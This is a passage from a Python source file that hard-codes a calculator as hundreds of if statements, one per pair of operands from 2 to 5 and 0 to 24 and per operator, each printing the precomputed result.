2')\nif num_1 == 2 and num_2 == 1 and calc == '/': print('2 / 1 = 2.0')\nif num_1 == 2 and num_2 == 2 and calc == '+': print('2 + 2 = 4')\nif num_1 == 2 and num_2 == 2 and calc == '-': print('2 - 2 = 0')\nif num_1 == 2 and num_2 == 2 and calc == '*': print('2 * 2 = 4')\nif num_1 == 2 and num_2 == 2 and calc == '/': print('2 / 2 = 1.0')\nif num_1 == 2 and num_2 == 3 and calc == '+': print('2 + 3 = 5')\nif num_1 == 2 and num_2 == 3 and calc == '-': print('2 - 3 = -1')\nif num_1 == 2 and num_2 == 3 and calc == '*': print('2 * 3 = 6')\nif num_1 == 2 and num_2 == 3 and calc == '/': print('2 / 3 = 0.6666666666666666')\nif num_1 == 2 and num_2 == 4 and calc == '+': print('2 + 4 = 6')\nif num_1 == 2 and num_2 == 4 and calc == '-': print('2 - 4 = -2')\nif num_1 == 2 and num_2 == 4 and calc == '*': print('2 * 4 = 8')\nif num_1 == 2 and num_2 == 4 and calc == '/': print('2 / 4 = 0.5')\nif num_1 == 2 and num_2 == 5 and calc == '+': print('2 + 5 = 7')\nif num_1 == 2 and num_2 == 5 and calc == '-': print('2 - 5 = -3')\nif num_1 == 2 and num_2 == 5 and calc == '*': print('2 * 5 = 10')\nif num_1 == 2 and num_2 == 5 and calc == '/': print('2 / 5 = 0.4')\nif num_1 == 2 and num_2 == 6 and calc == '+': print('2 + 6 = 8')\nif num_1 == 2 and num_2 == 6 and calc == '-': print('2 - 6 = -4')\nif num_1 == 2 and num_2 == 6 and calc == '*': print('2 * 6 = 12')\nif num_1 == 2 and num_2 == 6 and calc == '/': print('2 / 6 = 0.3333333333333333')\nif num_1 == 2 and num_2 == 7 and calc == '+': print('2 + 7 = 9')\nif num_1 == 2 and num_2 == 7 and calc == '-': print('2 - 7 = -5')\nif num_1 == 2 and num_2 == 7 and calc == '*': print('2 * 7 = 14')\nif num_1 == 2 and num_2 == 7 and calc == '/': print('2 / 7 = 0.2857142857142857')\nif num_1 == 2 and num_2 == 8 and calc == '+': print('2 + 8 = 10')\nif num_1 == 2 and num_2 == 8 and calc == '-': print('2 - 8 = -6')\nif num_1 == 2 and num_2 == 8 and calc == '*': print('2 * 8 = 16')\nif num_1 == 2 and num_2 == 8 and calc == '/': print('2 / 8 = 0.25')\nif num_1 == 2 and num_2 == 9 and calc == '+': print('2 + 9 = 11')\nif num_1 == 2 and num_2 == 9 and calc == '-': print('2 - 9 = -7')\nif num_1 == 2 and num_2 == 9 and calc == '*': print('2 * 9 = 18')\nif num_1 == 2 and num_2 == 9 and calc == '/': print('2 / 9 = 0.2222222222222222')\nif num_1 == 2 and num_2 == 10 and calc == '+': print('2 + 10 = 12')\nif num_1 == 2 and num_2 == 10 and calc == '-': print('2 - 10 = -8')\nif num_1 == 2 and num_2 == 10 and calc == '*': print('2 * 10 = 20')\nif num_1 == 2 and num_2 == 10 and calc == '/': print('2 / 10 = 0.2')\nif num_1 == 2 and num_2 == 11 and calc == '+': print('2 + 11 = 13')\nif num_1 == 2 and num_2 == 11 and calc == '-': print('2 - 11 = -9')\nif num_1 == 2 and num_2 == 11 and calc == '*': print('2 * 11 = 22')\nif num_1 == 2 and num_2 == 11 and calc == '/': print('2 / 11 = 0.18181818181818182')\nif num_1 == 2 and num_2 == 12 and calc == '+': print('2 + 12 = 14')\nif num_1 == 2 and num_2 == 12 and calc == '-': print('2 - 12 = -10')\nif num_1 == 2 and num_2 == 12 and calc == '*': print('2 * 12 = 24')\nif num_1 == 2 and num_2 == 12 and calc == '/': print('2 / 12 = 0.16666666666666666')\nif num_1 == 2 and num_2 == 13 and calc == '+': print('2 + 13 = 15')\nif num_1 == 2 and num_2 == 13 and calc == '-': print('2 - 13 = -11')\nif num_1 == 2 and num_2 == 13 and calc == '*': print('2 * 13 = 26')\nif num_1 == 2 and num_2 == 13 and calc == '/': print('2 / 13 = 0.15384615384615385')\nif num_1 == 2 and num_2 == 14 and calc == '+': print('2 + 14 = 16')\nif num_1 == 2 and num_2 == 14 and calc == '-': print('2 - 14 = -12')\nif num_1 == 2 and num_2 == 14 and calc == '*': print('2 * 14 = 28')\nif num_1 == 2 and num_2 == 14 and calc == '/': print('2 / 14 = 0.14285714285714285')\nif num_1 == 2 and num_2 == 15 and calc == '+': print('2 + 15 = 17')\nif num_1 == 2 and num_2 == 15 and calc == '-': print('2 - 15 = -13')\nif num_1 == 2 and num_2 == 15 and calc == '*': print('2 * 15 = 30')\nif num_1 == 2 and num_2 == 15 and calc == '/': print('2 / 15 = 0.13333333333333333')\nif num_1 == 2 and num_2 == 16 and calc == '+': print('2 + 16 = 18')\nif num_1 == 2 and num_2 == 16 and calc == '-': print('2 - 16 = -14')\nif num_1 == 2 and num_2 == 16 and calc == '*': print('2 * 16 = 32')\nif num_1 == 2 and num_2 == 16 and calc == '/': print('2 / 16 = 0.125')\nif num_1 == 2 and num_2 == 17 and calc == '+': print('2 + 17 = 19')\nif num_1 == 2 and num_2 == 17 and calc == '-': print('2 - 17 = -15')\nif num_1 == 2 and num_2 == 17 and calc == '*': print('2 * 17 = 34')\nif num_1 == 2 and num_2 == 17 and calc == '/': print('2 / 17 = 0.11764705882352941')\nif num_1 == 2 and num_2 == 18 and calc == '+': print('2 + 18 = 20')\nif num_1 == 2 and num_2 == 18 and calc == '-': print('2 - 18 = -16')\nif num_1 == 2 and num_2 == 18 and calc == '*': print('2 * 18 = 36')\nif num_1 == 2 and num_2 == 18 and calc == '/': print('2 / 18 = 0.1111111111111111')\nif num_1 == 2 and num_2 == 19 and calc == '+': print('2 + 19 = 21')\nif num_1 == 2 and num_2 == 19 and calc == '-': print('2 - 19 = -17')\nif num_1 == 2 and num_2 == 19 and calc == '*': print('2 * 19 = 38')\nif num_1 == 2 and num_2 == 19 and calc == '/': print('2 / 19 = 0.10526315789473684')\nif num_1 == 2 and num_2 == 20 and calc == '+': print('2 + 20 = 22')\nif num_1 == 2 and num_2 == 20 and calc == '-': print('2 - 20 = -18')\nif num_1 == 2 and num_2 == 20 and calc == '*': print('2 * 20 = 40')\nif num_1 == 2 and num_2 == 20 and calc == '/': print('2 / 20 = 0.1')\nif num_1 == 2 and num_2 == 21 and calc == '+': print('2 + 21 = 23')\nif num_1 == 2 and num_2 == 21 and calc == '-': print('2 - 21 = -19')\nif num_1 == 2 and num_2 == 21 and calc == '*': print('2 * 21 = 42')\nif num_1 == 2 and num_2 == 21 and calc == '/': print('2 / 21 = 0.09523809523809523')\nif num_1 == 2 and num_2 == 22 and calc == '+': print('2 + 22 = 24')\nif num_1 == 2 and num_2 == 22 and calc == '-': print('2 - 22 = -20')\nif num_1 == 2 and num_2 == 22 and calc == '*': print('2 * 22 = 44')\nif num_1 == 2 and num_2 == 22 and calc == '/': print('2 / 22 = 0.09090909090909091')\nif num_1 == 2 and num_2 == 23 and calc == '+': print('2 + 23 = 25')\nif num_1 == 2 and num_2 == 23 and calc == '-': print('2 - 23 = -21')\nif num_1 == 2 and num_2 == 23 and calc == '*': print('2 * 23 = 46')\nif num_1 == 2 and num_2 == 23 and calc == '/': print('2 / 23 = 0.08695652173913043')\nif num_1 == 2 and num_2 == 24 and calc == '+': print('2 + 24 = 26')\nif num_1 == 2 and num_2 == 24 and calc == '-': print('2 - 24 = -22')\nif num_1 == 2 and num_2 == 24 and calc == '*': print('2 * 24 = 48')\nif num_1 == 2 and num_2 == 24 and calc == '/': print('2 / 24 = 0.08333333333333333')\nif num_1 == 3 and num_2 == 0 and calc == '+': print('3 + 0 = 3')\nif num_1 == 3 and num_2 == 0 and calc == '-': print('3 - 0 = 3')\nif num_1 == 3 and num_2 == 0 and calc == '*': print('3 * 0 = 0')\nif num_1 == 3 and num_2 == 0 and calc == '/': print('3 / 0 = Cannot divide by zero!')\nif num_1 == 3 and num_2 == 1 and calc == '+': print('3 + 1 = 4')\nif num_1 == 3 and num_2 == 1 and calc == '-': print('3 - 1 = 2')\nif num_1 == 3 and num_2 == 1 and calc == '*': print('3 * 1 = 3')\nif num_1 == 3 and num_2 == 1 and calc == '/': print('3 / 1 = 3.0')\nif num_1 == 3 and num_2 == 2 and calc == '+': print('3 + 2 = 5')\nif num_1 == 3 and num_2 == 2 and calc == '-': print('3 - 2 = 1')\nif num_1 == 3 and num_2 == 2 and calc == '*': print('3 * 2 = 6')\nif num_1 == 3 and num_2 == 2 and calc == '/': print('3 / 2 = 1.5')\nif num_1 == 3 and num_2 == 3 and calc == '+': print('3 + 3 = 6')\nif num_1 == 3 and num_2 == 3 and calc == '-': print('3 - 3 = 0')\nif num_1 == 3 and num_2 == 3 and calc == '*': print('3 * 3 = 9')\nif num_1 == 3 and num_2 == 3 and calc == '/': print('3 / 3 = 1.0')\nif num_1 == 3 and num_2 == 4 and calc == '+': print('3 + 4 = 7')\nif num_1 == 3 and num_2 == 4 and calc == '-': print('3 - 4 = -1')\nif num_1 == 3 and num_2 == 4 and calc == '*': print('3 * 4 = 12')\nif num_1 == 3 and num_2 == 4 and calc == '/': print('3 / 4 = 0.75')\nif num_1 == 3 and num_2 == 5 and calc == '+': print('3 + 5 = 8')\nif num_1 == 3 and num_2 == 5 and calc == '-': print('3 - 5 = -2')\nif num_1 == 3 and num_2 == 5 and calc == '*': print('3 * 5 = 15')\nif num_1 == 3 and num_2 == 5 and calc == '/': print('3 / 5 = 0.6')\nif num_1 == 3 and num_2 == 6 and calc == '+': print('3 + 6 = 9')\nif num_1 == 3 and num_2 == 6 and calc == '-': print('3 - 6 = -3')\nif num_1 == 3 and num_2 == 6 and calc == '*': print('3 * 6 = 18')\nif num_1 == 3 and num_2 == 6 and calc == '/': print('3 / 6 = 0.5')\nif num_1 == 3 and num_2 == 7 and calc == '+': print('3 + 7 = 10')\nif num_1 == 3 and num_2 == 7 and calc == '-': print('3 - 7 = -4')\nif num_1 == 3 and num_2 == 7 and calc == '*': print('3 * 7 = 21')\nif num_1 == 3 and num_2 == 7 and calc == '/': print('3 / 7 = 0.42857142857142855')\nif num_1 == 3 and num_2 == 8 and calc == '+': print('3 + 8 = 11')\nif num_1 == 3 and num_2 == 8 and calc == '-': print('3 - 8 = -5')\nif num_1 == 3 and num_2 == 8 and calc == '*': print('3 * 8 = 24')\nif num_1 == 3 and num_2 == 8 and calc == '/': print('3 / 8 = 0.375')\nif num_1 == 3 and num_2 == 9 and calc == '+': print('3 + 9 = 12')\nif num_1 == 3 and num_2 == 9 and calc == '-': print('3 - 9 = -6')\nif num_1 == 3 and num_2 == 9 and calc == '*': print('3 * 9 = 27')\nif num_1 == 3 and num_2 == 9 and calc == '/': print('3 / 9 = 0.3333333333333333')\nif num_1 == 3 and num_2 == 10 and calc == '+': print('3 + 10 = 13')\nif num_1 == 3 and num_2 == 10 and calc == '-': print('3 - 10 = -7')\nif num_1 == 3 and num_2 == 10 and calc == '*': print('3 * 10 = 30')\nif num_1 == 3 and num_2 == 10 and calc == '/': print('3 / 10 = 0.3')\nif num_1 == 3 and num_2 == 11 and calc == '+': print('3 + 11 = 14')\nif num_1 == 3 and num_2 == 11 and calc == '-': print('3 - 11 = -8')\nif num_1 == 3 and num_2 == 11 and calc == '*': print('3 * 11 = 33')\nif num_1 == 3 and num_2 == 11 and calc == '/': print('3 / 11 = 0.2727272727272727')\nif num_1 == 3 and num_2 == 12 and calc == '+': print('3 + 12 = 15')\nif num_1 == 3 and num_2 == 12 and calc == '-': print('3 - 12 = -9')\nif num_1 == 3 and num_2 == 12 and calc == '*': print('3 * 12 = 36')\nif num_1 == 3 and num_2 == 12 and calc == '/': print('3 / 12 = 0.25')\nif num_1 == 3 and num_2 == 13 and calc == '+': print('3 + 13 = 16')\nif num_1 == 3 and num_2 == 13 and calc == '-': print('3 - 13 = -10')\nif num_1 == 3 and num_2 == 13 and calc == '*': print('3 * 13 = 39')\nif num_1 == 3 and num_2 == 13 and calc == '/': print('3 / 13 = 0.23076923076923078')\nif num_1 == 3 and num_2 == 14 and calc == '+': print('3 + 14 = 17')\nif num_1 == 3 and num_2 == 14 and calc == '-': print('3 - 14 = -11')\nif num_1 == 3 and num_2 == 14 and calc == '*': print('3 * 14 = 42')\nif num_1 == 3 and num_2 == 14 and calc == '/': print('3 / 14 = 0.21428571428571427')\nif num_1 == 3 and num_2 == 15 and calc == '+': print('3 + 15 = 18')\nif num_1 == 3 and num_2 == 15 and calc == '-': print('3 - 15 = -12')\nif num_1 == 3 and num_2 == 15 and calc == '*': print('3 * 15 = 45')\nif num_1 == 3 and num_2 == 15 and calc == '/': print('3 / 15 = 0.2')\nif num_1 == 3 and num_2 == 16 and calc == '+': print('3 + 16 = 19')\nif num_1 == 3 and num_2 == 16 and calc == '-': print('3 - 16 = -13')\nif num_1 == 3 and num_2 == 16 and calc == '*': print('3 * 16 = 48')\nif num_1 == 3 and num_2 == 16 and calc == '/': print('3 / 16 = 0.1875')\nif num_1 == 3 and num_2 == 17 and calc == '+': print('3 + 17 = 20')\nif num_1 == 3 and num_2 == 17 and calc == '-': print('3 - 17 = -14')\nif num_1 == 3 and num_2 == 17 and calc == '*': print('3 * 17 = 51')\nif num_1 == 3 and num_2 == 17 and calc == '/': print('3 / 17 = 0.17647058823529413')\nif num_1 == 3 and num_2 == 18 and calc == '+': print('3 + 18 = 21')\nif num_1 == 3 and num_2 == 18 and calc == '-': print('3 - 18 = -15')\nif num_1 == 3 and num_2 == 18 and calc == '*': print('3 * 18 = 54')\nif num_1 == 3 and num_2 == 18 and calc == '/': print('3 / 18 = 0.16666666666666666')\nif num_1 == 3 and num_2 == 19 and calc == '+': print('3 + 19 = 22')\nif num_1 == 3 and num_2 == 19 and calc == '-': print('3 - 19 = -16')\nif num_1 == 3 and num_2 == 19 and calc == '*': print('3 * 19 = 57')\nif num_1 == 3 and num_2 == 19 and calc == '/': print('3 / 19 = 0.15789473684210525')\nif num_1 == 3 and num_2 == 20 and calc == '+': print('3 + 20 = 23')\nif num_1 == 3 and num_2 == 20 and calc == '-': print('3 - 20 = -17')\nif num_1 == 3 and num_2 == 20 and calc == '*': print('3 * 20 = 60')\nif num_1 == 3 and num_2 == 20 and calc == '/': print('3 / 20 = 0.15')\nif num_1 == 3 and num_2 == 21 and calc == '+': print('3 + 21 = 24')\nif num_1 == 3 and num_2 == 21 and calc == '-': print('3 - 21 = -18')\nif num_1 == 3 and num_2 == 21 and calc == '*': print('3 * 21 = 63')\nif num_1 == 3 and num_2 == 21 and calc == '/': print('3 / 21 = 0.14285714285714285')\nif num_1 == 3 and num_2 == 22 and calc == '+': print('3 + 22 = 25')\nif num_1 == 3 and num_2 == 22 and calc == '-': print('3 - 22 = -19')\nif num_1 == 3 and num_2 == 22 and calc == '*': print('3 * 22 = 66')\nif num_1 == 3 and num_2 == 22 and calc == '/': print('3 / 22 = 0.13636363636363635')\nif num_1 == 3 and num_2 == 23 and calc == '+': print('3 + 23 = 26')\nif num_1 == 3 and num_2 == 23 and calc == '-': print('3 - 23 = -20')\nif num_1 == 3 and num_2 == 23 and calc == '*': print('3 * 23 = 69')\nif num_1 == 3 and num_2 == 23 and calc == '/': print('3 / 23 = 0.13043478260869565')\nif num_1 == 3 and num_2 == 24 and calc == '+': print('3 + 24 = 27')\nif num_1 == 3 and num_2 == 24 and calc == '-': print('3 - 24 = -21')\nif num_1 == 3 and num_2 == 24 and calc == '*': print('3 * 24 = 72')\nif num_1 == 3 and num_2 == 24 and calc == '/': print('3 / 24 = 0.125')\nif num_1 == 4 and num_2 == 0 and calc == '+': print('4 + 0 = 4')\nif num_1 == 4 and num_2 == 0 and calc == '-': print('4 - 0 = 4')\nif num_1 == 4 and num_2 == 0 and calc == '*': print('4 * 0 = 0')\nif num_1 == 4 and num_2 == 0 and calc == '/': print('4 / 0 = Cannot divide by zero!')\nif num_1 == 4 and num_2 == 1 and calc == '+': print('4 + 1 = 5')\nif num_1 == 4 and num_2 == 1 and calc == '-': print('4 - 1 = 3')\nif num_1 == 4 and num_2 == 1 and calc == '*': print('4 * 1 = 4')\nif num_1 == 4 and num_2 == 1 and calc == '/': print('4 / 1 = 4.0')\nif num_1 == 4 and num_2 == 2 and calc == '+': print('4 + 2 = 6')\nif num_1 == 4 and num_2 == 2 and calc == '-': print('4 - 2 = 2')\nif num_1 == 4 and num_2 == 2 and calc == '*': print('4 * 2 = 8')\nif num_1 == 4 and num_2 == 2 and calc == '/': print('4 / 2 = 2.0')\nif num_1 == 4 and num_2 == 3 and calc == '+': print('4 + 3 = 7')\nif num_1 == 4 and num_2 == 3 and calc == '-': print('4 - 3 = 1')\nif num_1 == 4 and num_2 == 3 and calc == '*': print('4 * 3 = 12')\nif num_1 == 4 and num_2 == 3 and calc == '/': print('4 / 3 = 1.3333333333333333')\nif num_1 == 4 and num_2 == 4 and calc == '+': print('4 + 4 = 8')\nif num_1 == 4 and num_2 == 4 and calc == '-': print('4 - 4 = 0')\nif num_1 == 4 and num_2 == 4 and calc == '*': print('4 * 4 = 16')\nif num_1 == 4 and num_2 == 4 and calc == '/': print('4 / 4 = 1.0')\nif num_1 == 4 and num_2 == 5 and calc == '+': print('4 + 5 = 9')\nif num_1 == 4 and num_2 == 5 and calc == '-': print('4 - 5 = -1')\nif num_1 == 4 and num_2 == 5 and calc == '*': print('4 * 5 = 20')\nif num_1 == 4 and num_2 == 5 and calc == '/': print('4 / 5 = 0.8')\nif num_1 == 4 and num_2 == 6 and calc == '+': print('4 + 6 = 10')\nif num_1 == 4 and num_2 == 6 and calc == '-': print('4 - 6 = -2')\nif num_1 == 4 and num_2 == 6 and calc == '*': print('4 * 6 = 24')\nif num_1 == 4 and num_2 == 6 and calc == '/': print('4 / 6 = 0.6666666666666666')\nif num_1 == 4 and num_2 == 7 and calc == '+': print('4 + 7 = 11')\nif num_1 == 4 and num_2 == 7 and calc == '-': print('4 - 7 = -3')\nif num_1 == 4 and num_2 == 7 and calc == '*': print('4 * 7 = 28')\nif num_1 == 4 and num_2 == 7 and calc == '/': print('4 / 7 = 0.5714285714285714')\nif num_1 == 4 and num_2 == 8 and calc == '+': print('4 + 8 = 12')\nif num_1 == 4 and num_2 == 8 and calc == '-': print('4 - 8 = -4')\nif num_1 == 4 and num_2 == 8 and calc == '*': print('4 * 8 = 32')\nif num_1 == 4 and num_2 == 8 and calc == '/': print('4 / 8 = 0.5')\nif num_1 == 4 and num_2 == 9 and calc == '+': print('4 + 9 = 13')\nif num_1 == 4 and num_2 == 9 and calc == '-': print('4 - 9 = -5')\nif num_1 == 4 and num_2 == 9 and calc == '*': print('4 * 9 = 36')\nif num_1 == 4 and num_2 == 9 and calc == '/': print('4 / 9 = 0.4444444444444444')\nif num_1 == 4 and num_2 == 10 and calc == '+': print('4 + 10 = 14')\nif num_1 == 4 and num_2 == 10 and calc == '-': print('4 - 10 = -6')\nif num_1 == 4 and num_2 == 10 and calc == '*': print('4 * 10 = 40')\nif num_1 == 4 and num_2 == 10 and calc == '/': print('4 / 10 = 0.4')\nif num_1 == 4 and num_2 == 11 and calc == '+': print('4 + 11 = 15')\nif num_1 == 4 and num_2 == 11 and calc == '-': print('4 - 11 = -7')\nif num_1 == 4 and num_2 == 11 and calc == '*': print('4 * 11 = 44')\nif num_1 == 4 and num_2 == 11 and calc == '/': print('4 / 11 = 0.36363636363636365')\nif num_1 == 4 and num_2 == 12 and calc == '+': print('4 + 12 = 16')\nif num_1 == 4 and num_2 == 12 and calc == '-': print('4 - 12 = -8')\nif num_1 == 4 and num_2 == 12 and calc == '*': print('4 * 12 = 48')\nif num_1 == 4 and num_2 == 12 and calc == '/': print('4 / 12 = 0.3333333333333333')\nif num_1 == 4 and num_2 == 13 and calc == '+': print('4 + 13 = 17')\nif num_1 == 4 and num_2 == 13 and calc == '-': print('4 - 13 = -9')\nif num_1 == 4 and num_2 == 13 and calc == '*': print('4 * 13 = 52')\nif num_1 == 4 and num_2 == 13 and calc == '/': print('4 / 13 = 0.3076923076923077')\nif num_1 == 4 and num_2 == 14 and calc == '+': print('4 + 14 = 18')\nif num_1 == 4 and num_2 == 14 and calc == '-': print('4 - 14 = -10')\nif num_1 == 4 and num_2 == 14 and calc == '*': print('4 * 14 = 56')\nif num_1 == 4 and num_2 == 14 and calc == '/': print('4 / 14 = 0.2857142857142857')\nif num_1 == 4 and num_2 == 15 and calc == '+': print('4 + 15 = 19')\nif num_1 == 4 and num_2 == 15 and calc == '-': print('4 - 15 = -11')\nif num_1 == 4 and num_2 == 15 and calc == '*': print('4 * 15 = 60')\nif num_1 == 4 and num_2 == 15 and calc == '/': print('4 / 15 = 0.26666666666666666')\nif num_1 == 4 and num_2 == 16 and calc == '+': print('4 + 16 = 20')\nif num_1 == 4 and num_2 == 16 and calc == '-': print('4 - 16 = -12')\nif num_1 == 4 and num_2 == 16 and calc == '*': print('4 * 16 = 64')\nif num_1 == 4 and num_2 == 16 and calc == '/': print('4 / 16 = 0.25')\nif num_1 == 4 and num_2 == 17 and calc == '+': print('4 + 17 = 21')\nif num_1 == 4 and num_2 == 17 and calc == '-': print('4 - 17 = -13')\nif num_1 == 4 and num_2 == 17 and calc == '*': print('4 * 17 = 68')\nif num_1 == 4 and num_2 == 17 and calc == '/': print('4 / 17 = 0.23529411764705882')\nif num_1 == 4 and num_2 == 18 and calc == '+': print('4 + 18 = 22')\nif num_1 == 4 and num_2 == 18 and calc == '-': print('4 - 18 = -14')\nif num_1 == 4 and num_2 == 18 and calc == '*': print('4 * 18 = 72')\nif num_1 == 4 and num_2 == 18 and calc == '/': print('4 / 18 = 0.2222222222222222')\nif num_1 == 4 and num_2 == 19 and calc == '+': print('4 + 19 = 23')\nif num_1 == 4 and num_2 == 19 and calc == '-': print('4 - 19 = -15')\nif num_1 == 4 and num_2 == 19 and calc == '*': print('4 * 19 = 76')\nif num_1 == 4 and num_2 == 19 and calc == '/': print('4 / 19 = 0.21052631578947367')\nif num_1 == 4 and num_2 == 20 and calc == '+': print('4 + 20 = 24')\nif num_1 == 4 and num_2 == 20 and calc == '-': print('4 - 20 = -16')\nif num_1 == 4 and num_2 == 20 and calc == '*': print('4 * 20 = 80')\nif num_1 == 4 and num_2 == 20 and calc == '/': print('4 / 20 = 0.2')\nif num_1 == 4 and num_2 == 21 and calc == '+': print('4 + 21 = 25')\nif num_1 == 4 and num_2 == 21 and calc == '-': print('4 - 21 = -17')\nif num_1 == 4 and num_2 == 21 and calc == '*': print('4 * 21 = 84')\nif num_1 == 4 and num_2 == 21 and calc == '/': print('4 / 21 = 0.19047619047619047')\nif num_1 == 4 and num_2 == 22 and calc == '+': print('4 + 22 = 26')\nif num_1 == 4 and num_2 == 22 and calc == '-': print('4 - 22 = -18')\nif num_1 == 4 and num_2 == 22 and calc == '*': print('4 * 22 = 88')\nif num_1 == 4 and num_2 == 22 and calc == '/': print('4 / 22 = 0.18181818181818182')\nif num_1 == 4 and num_2 == 23 and calc == '+': print('4 + 23 = 27')\nif num_1 == 4 and num_2 == 23 and calc == '-': print('4 - 23 = -19')\nif num_1 == 4 and num_2 == 23 and calc == '*': print('4 * 23 = 92')\nif num_1 == 4 and num_2 == 23 and calc == '/': print('4 / 23 = 0.17391304347826086')\nif num_1 == 4 and num_2 == 24 and calc == '+': print('4 + 24 = 28')\nif num_1 == 4 and num_2 == 24 and calc == '-': print('4 - 24 = -20')\nif num_1 == 4 and num_2 == 24 and calc == '*': print('4 * 24 = 96')\nif num_1 == 4 and num_2 == 24 and calc == '/': print('4 / 24 = 0.16666666666666666')\nif num_1 == 5 and num_2 == 0 and calc == '+': print('5 + 0 = 5')\nif num_1 == 5 and num_2 == 0 and calc == '-': print('5 - 0 = 5')\nif num_1 == 5 and num_2 == 0 and calc == '*': print('5 * 0 = 0')\nif num_1 == 5 and num_2 == 0 and calc == '/': print('5 / 0 = Cannot divide by zero!')\nif num_1 == 5 and num_2 == 1 and calc == '+': print('5 + 1 = 6')\nif num_1 == 5 and num_2 == 1 and calc == '-': print('5 - 1 = 4')\nif num_1 == 5 and num_2 == 1 and calc == '*': print('5 * 1 = 5')\nif num_1 == 5 and num_2 == 1 and calc == '/': print('5 / 1 = 5.0')\nif num_1 == 5 and num_2 == 2 and calc == '+': print('5 + 2 = 7')\nif num_1 == 5 and num_2 == 2 and calc == '-': print('5 - 2 = 3')\nif num_1 == 5 and num_2 == 2 and calc == '*': print('5 * 2 = 10')\nif num_1 == 5 and num_2 == 2 and calc == '/': print('5 / 2 = 2.5')\nif num_1 == 5 and num_2 == 3 and calc == '+': print('5 + 3 = 8')\nif num_1 == 5 and num_2 == 3 and calc == '-': print('5 - 3 = 2')\nif num_1 == 5 and num_2 == 3 and calc == '*': print('5 * 3 = 15')\nif num_1 == 5 and num_2 == 3 and calc == '/': print('5 / 3 = 1.6666666666666667')\nif num_1 == 5 and num_2 == 4 and calc == '+': print('5 + 4 = 9')\nif num_1 == 5 and num_2 == 4 and calc == '-': print('5 - 4 = 1')\nif num_1 == 5 and num_2 == 4 and calc == '*': print('5 * 4 = 20')\nif num_1 == 5 and num_2 == 4 and calc == '/': print('5 / 4 = 1.25')\nif num_1 == 5 and num_2 == 5 and calc == '+': print('5 + 5 = 10')\nif num_1 == 5 and num_2 == 5 and calc == '-': print('5 - 5 = 0')\nif num_1 == 5 and num_2 == 5 and calc == '*': print('5 * 5 = 25')\nif num_1 == 5 and num_2 == 5 and calc == '/': print('5 / 5 = 1.0')\nif num_1 == 5 and num_2 == 6 and calc == '+': print('5 + 6 = 11')\nif num_1 == 5 and num_2 == 6 and calc == '-': print('5 - 6 = -1')\nif num_1 == 5 and num_2 == 6 and calc == '*': print('5 * 6 = 30')\nif num_1 == 5 and num_2 == 6 and calc == '/': print('5 / 6 = 0.8333333333333334')\nif num_1 == 5 and num_2 == 7 and calc == '+': print('5 + 7 = 12')\nif num_1 == 5 and num_2 == 7 and calc == '-': print('5 - 7 = -2')\nif num_1 == 5 and num_2 == 7 and calc == '*': print('5 * 7 = 35')\nif num_1 == 5 and num_2 == 7 and calc == '/': print('5 / 7 = 0.7142857142857143')\nif num_1 == 5 and num_2 == 8 and calc == '+': print('5 + 8 = 13')\nif num_1 == 5 and num_2 == 8 and calc == '-': print('5 - 8 = -3')\nif num_1 == 5 and num_2 == 8 and calc == '*': print('5 * 8 = 40')\nif num_1 == 5 and num_2 == 8 and calc == '/': print('5 / 8 = 0.625')\nif num_1 == 5 and num_2 == 9 and calc == '+': print('5 + 9 = 14')\nif num_1 == 5 and num_2 == 9 and calc == '-': print('5 - 9 = -4')\nif num_1 == 5 and num_2 == 9 and calc == '*': print('5 * 9 = 45')\nif num_1 == 5 and num_2 == 9 and calc == '/': print('5 / 9 = 0.5555555555555556')\nif num_1 == 5 and num_2 == 10 and calc == '+': print('5 + 10 = 15')\nif num_1 == 5 and num_2 == 10 and calc == '-': print('5 - 10 = -5')\nif num_1 == 5 and num_2 == 10 and calc == '*': print('5 * 10 = 50')\nif num_1 == 5 and num_2 == 10 and calc == '/': print('5 / 10 = 0.5')\nif num_1 == 5 and num_2 == 11 and calc == '+': print('5 + 11 = 16')\nif num_1 == 5 and num_2 == 11 and calc == '-': print('5 - 11 = -6')\nif num_1 == 5 and num_2 == 11 and calc == '*': print('5 * 11 = 55')\nif num_1 == 5 and num_2 == 11 and calc == '/': print('5 / 11 = 0.45454545454545453')\nif num_1 == 5 and num_2 == 12 and calc == '+': print('5 + 12 = 17')\nif num_1 == 5 and num_2 == 12 and calc == '-': print('5 - 12 = -7')\nif num_1 == 5 and num_2 == 12 and calc == '*': print('5 * 12 = 60')\nif num_1 == 5 and num_2 == 12 and calc == '/': print('5 / 12 = 0.4166666666666667')\nif num_1 == 5 and num_2 == 13 and calc == '+': print('5 + 13 = 18')\nif num_1 == 5 and num_2 == 13 and calc == '-': print('5 - 13 = -8')\nif num_1 == 5 and num_2 == 13 and calc == '*': print('5 * 13 = 65')\nif num_1 == 5 and num_2 == 13 and calc == '/': print('5 / 13 = 0.38461538461538464')\nif num_1 == 5 and num_2 == 14 and calc == '+': print('5 + 14 = 19')\nif num_1 == 5 and num_2 == 14 and calc == '-': print('5 - 14 = -9')\nif num_1 == 5 and num_2 == 14 and calc == '*': print('5 * 14 = 70')\nif num_1 == 5 and num_2 == 14 and calc == '/': print('5 / 14 = 0.35714285714285715')\nif num_1 == 5 and num_2 == 15 and calc == '+': print('5 + 15 = 20')\nif num_1 == 5 and num_2 == 15 and calc == '-': print('5 - 15 = -10')\nif num_1 == 5 and num_2 == 15 and calc == '*': print('5 * 15 = 75')\nif num_1 == 5 and num_2 == 15 and calc == '/': print('5 / 15 = 0.3333333333333333')\nif num_1 == 5 and num_2 == 16 and calc == '+': print('5 + 16 = 21')\nif num_1 == 5 and num_2 == 16 and calc == '-': print('5 - 16 = -11')\nif num_1 == 5 and num_2 == 16 and calc == '*': print('5 * 16 = 80')\nif num_1 == 5 and num_2 == 16 and calc == '/': print('5 / 16 = 0.3125')\nif num_1 == 5 and num_2 == 17 and calc == '+': print('5 + 17 = 22')\nif num_1 == 5 and num_2 == 17 and calc == '-': print('5 - 17 = -12')\nif num_1 == 5 and num_2 == 17 and calc == '*': print('5 * 17 = 85')\nif num_1 == 5 and num_2 == 17 and calc == '/': print('5 / 17 = 0.29411764705882354')\nif num_1 == 5 and num_2 == 18 and calc == '+': print('5 + 18 = 23')\nif num_1 == 5 and num_2 == 18 and calc == '-': print('5 - 18 = -13')\nif num_1 == 5 and num_2 == 18 and calc == '*': print('5 * 18 = 90')\nif num_1 == 5 and num_2 == 18 and calc == '/': print('5 / 18 = 0.2777777777777778')\nif num_1 == 5 and num_2 == 19 and calc == '+': print('5 + 19 = 24')\nif num_1 == 5 and num_2 == 19 and calc == '-': print('5 - 19 = -14')\nif num_1 == 5 and num_2 == 19 and calc == '*': print('5 * 19 = 95')\nif num_1 == 5 and 